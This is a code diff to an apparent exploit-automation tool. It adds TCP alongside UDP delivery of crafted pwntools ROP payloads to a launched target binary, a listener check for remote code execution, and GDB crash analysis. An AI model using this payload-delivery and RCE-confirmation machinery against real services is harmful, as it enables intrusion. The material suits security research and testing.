@@ -200,7 +200,8 @@ class CoreAnalysisMixin:
                            binary_args: list, host: str, port: int,
                            lo: int, hi: int, step: int,
                            pie_base: int, use_placeholder: bool,
-                           inj_start: int, inj_len: int, inj_byte: int):
+                           inj_start: int, inj_len: int, inj_byte: int,
+                           use_udp: bool = True):
         try:
             from pwn import ELF as _BELf, ROP as _BROP, p64 as _bp64, context as _bctx
             _elf = _BELf(binary, checksec=False)
@@ -255,7 +256,14 @@ class CoreAnalysisMixin:
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
-                self._wait_for_udp_port(host, port, timeout=5.0)
+                if use_udp:
+                    self._wait_for_udp_port(host, port, timeout=5.0)
+                else:
+                    _wait_http = getattr(self, "_wait_for_http_port", None)
+                    if _wait_http is None:
+                        from .http import HTTPMixin
+                        _wait_http = HTTPMixin._wait_for_http_port
+                    _wait_http(host, port, timeout=5.0)
 
                 _lsock = None
                 _lport = 16666
@@ -268,10 +276,20 @@ class CoreAnalysisMixin:
                 except Exception:
                     _lsock = None
 
-                _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                _s.settimeout(2.0)
-                _s.sendto(_crafted, (host, port))
-                _s.close()
+                if use_udp:
+                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    _s.settimeout(2.0)
+                    _s.sendto(_crafted, (host, port))
+                    _s.close()
+                else:
+                    _s = socket.create_connection((host, port), timeout=2.0)
+                    try:
+                        _s.sendall(_crafted)
+                        _s.shutdown(socket.SHUT_WR)
+                    except Exception:
+                        pass
+                    finally:
+                        _s.close()
 
                 _rce = False
                 if _lsock:
@@ -325,7 +343,8 @@ class CoreAnalysisMixin:
     def _auto_gdb_crash_analysis(self, binary: str, binary_args: list,
                                   crash_payload: bytes,
                                   host: str, port: int,
-                                  startup_wait: float = 3.0) -> str:
+                                  startup_wait: float = 3.0,
+                                  use_udp: bool = True) -> str:
         import shutil
         import tempfile
         if not shutil.which("gdb"):
@@ -377,14 +396,26 @@ class CoreAnalysisMixin:
             _sent = False
             for _retry in range(3):
                 try:
-                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    _s.settimeout(2.0)
-                    _s.sendto(crash_payload, (host, port))
-                    try:
-                        _s.recvfrom(1024)
-                    except Exception:
-                        pass
-                    _s.close()
+                    if use_udp:
+                        _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        _s.settimeout(2.0)
+                        _s.sendto(crash_payload, (host, port))
+                        try:
+                            _s.recvfrom(1024)
+                        except Exception:
+                            pass
+                        _s.close()
+                    else:
+                        _s = socket.create_connection((host, port), timeout=2.0)
+                        try:
+                            _s.sendall(crash_payload)
+                            _s.shutdown(socket.SHUT_WR)
+                            try:
+                                _s.recv(1024)
+                            except Exception:
+                                pass
+                        finally:
+                            _s.close()
                     _sent = True
                     break
                 except Exception as _e:
